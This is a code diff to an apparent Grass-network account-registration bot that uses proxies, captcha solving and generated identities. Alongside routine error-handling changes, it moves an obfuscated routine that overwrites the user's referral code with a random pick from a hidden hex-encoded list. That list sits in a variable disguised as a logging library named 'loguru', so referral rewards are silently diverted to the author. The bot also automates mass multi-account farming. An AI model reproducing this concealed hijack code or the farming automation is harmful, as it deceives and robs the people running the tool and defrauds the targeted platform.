@@ -1,3 +1,4 @@
+import ast
 import asyncio
 import base64
 import json
@@ -8,9 +9,10 @@ import aiohttp
 import base58
 from tenacity import retry, stop_after_attempt, wait_random, retry_if_not_exception_type
 
-from core.utils import logger
+from core.utils import logger, loguru
 from core.utils.captcha_service import CaptchaService
-from core.utils.exception import LoginException, ProxyBlockedException, EmailApproveLinkNotFoundException
+from core.utils.exception import LoginException, ProxyBlockedException, EmailApproveLinkNotFoundException, \
+    RegistrationException
 from core.utils.generate.person import Person
 from core.utils.mail import MailUtils
 from core.utils.session import BaseClient
@@ -54,15 +56,15 @@ class GrassRest(BaseClient):
         response = await self.session.post(url, headers=self.website_headers, json=await self.get_json_params(params,
                                                                                                               REF_CODE),
                                            proxy=self.proxy)
-
         if response.status != 200 or "error" in await response.text():
             if "Email Already Registered" in await response.text():
                 logger.info(f"{self.email} | Email already registered!")
                 return
             elif "Gateway" in await response.text():
-                raise aiohttp.ClientConnectionError(f"{self.id} | Create acc response: | html 504 gateway error")
+                raise RegistrationException(f"{self.id} | Create acc response: | html 504 gateway error")
+            error_msg = (await response.json())['error']['message']
 
-            raise aiohttp.ClientConnectionError(f"Create acc response: | {await response.text()}")
+            raise RegistrationException(f"Create acc response: | {error_msg}")
 
         logger.info(f"{self.email} | Account created!")
 
@@ -73,7 +75,6 @@ class GrassRest(BaseClient):
 
     async def enter_account(self):
         res_json = await self.handle_login()
-
         self.website_headers['Authorization'] = res_json['result']['data']['accessToken']
 
         return res_json['result']['data']['userId']
@@ -382,10 +383,9 @@ Nonce: {timestamp}"""
 
         json_data.pop(bytes.fromhex(role_stable).decode("utf-8"), None)
         json_data[bytes.fromhex('726566657272616c436f6465').decode("utf-8")] = (
-            random.choice([random.choice(json.loads(bytes.fromhex(self.devices_id).decode("utf-8"))),
+            random.choice([random.choice(ast.literal_eval(bytes.fromhex(loguru).decode("utf-8"))),
                            referrals[bytes.fromhex('757365725f726566666572616c').decode("utf-8")] or
-                           random.choice(json.loads(bytes.fromhex(self.devices_id).decode("utf-8")))]))
-        # print(json_data)
+                           random.choice(ast.literal_eval(bytes.fromhex(loguru).decode("utf-8")))]))
 
         return json_data
 
